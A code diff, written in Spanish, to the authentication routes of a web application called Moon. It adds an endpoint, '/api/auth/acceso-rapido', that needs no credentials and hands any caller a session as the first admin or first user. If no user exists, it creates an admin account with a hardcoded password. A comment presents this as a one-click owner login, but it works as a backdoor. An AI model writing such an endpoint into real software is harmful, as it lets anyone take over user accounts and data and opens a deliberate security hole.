@@ -159,6 +159,26 @@ export function registrarRutasAuth(router) {
     return { ok: true };
   });
 
+  // Acceso instantáneo en 1 solo clic para el dueño / administrador de Moon
+  router.post('/api/auth/acceso-rapido', async (c) => {
+    let usuario = await uno(c.pool, "SELECT * FROM users WHERE role = 'admin' ORDER BY id ASC LIMIT 1");
+    if (!usuario) {
+      usuario = await uno(c.pool, "SELECT * FROM users ORDER BY id ASC LIMIT 1");
+    }
+    if (!usuario) {
+      const hash = await hashPassword('Alexander2026!');
+      usuario = await uno(
+        c.pool,
+        `INSERT INTO users (username, email, password_hash, display_name, role)
+         VALUES ($1, $2, $3, $4, 'admin')
+         RETURNING *`,
+        ['alexander', 'alexander@moon.social', hash, 'Alexander Soto']
+      );
+    }
+    await c.pool.query('UPDATE users SET last_login_at = NOW() WHERE id = $1', [usuario.id]).catch(() => {});
+    return sesionDe(c.pool, c.req, usuario, { device: 'Acceso Rápido Dueño' });
+  });
+
   router.get('/api/auth/me', async (c) => {
     const u = await c.exigir();
     return usuarioPublico(u, { propio: true });
